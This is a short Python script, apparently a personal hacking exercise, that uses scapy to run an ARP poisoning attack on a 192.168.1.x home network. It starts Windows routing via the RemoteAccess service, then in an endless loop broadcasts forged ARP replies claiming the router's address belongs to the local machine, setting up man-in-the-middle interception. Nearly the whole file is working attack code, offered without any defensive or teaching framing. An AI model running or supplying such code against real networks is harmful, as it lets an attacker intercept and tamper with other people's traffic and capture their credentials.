# use arp poisning :)
from scapy.all import Ether, ARP, srp, send

from time import sleep

def iproute_windows(status=True):
    # if not enables please to check if service is disabled
        # Search how to enable the service automatically without manual intervention .
    from services import WService
    service = WService("RemoteAccess")
    service.start()


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If IP is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src






def Spoof(router_ip):
    """
    Spoofs the target IP address to the router IP address
    """
    local_mac = get_mac('192.168.1.107')
    router_mac = get_mac(router_ip)
    arp_msg = ARP(pdst='192.168.1.255', hwdst='ff:ff:ff:ff:ff:ff', psrc=router_ip, hwsrc=local_mac,op='is-at')
    send(arp_msg,verbose=0,count=7)
    print("[+] Sent to {} : {} is-at {}".format("192.168.1.255", router_ip, router_mac))





iproute_windows()
while True:
    print('[+] Sleeping')
    sleep(5) 
    Spoof('192.168.1.1')
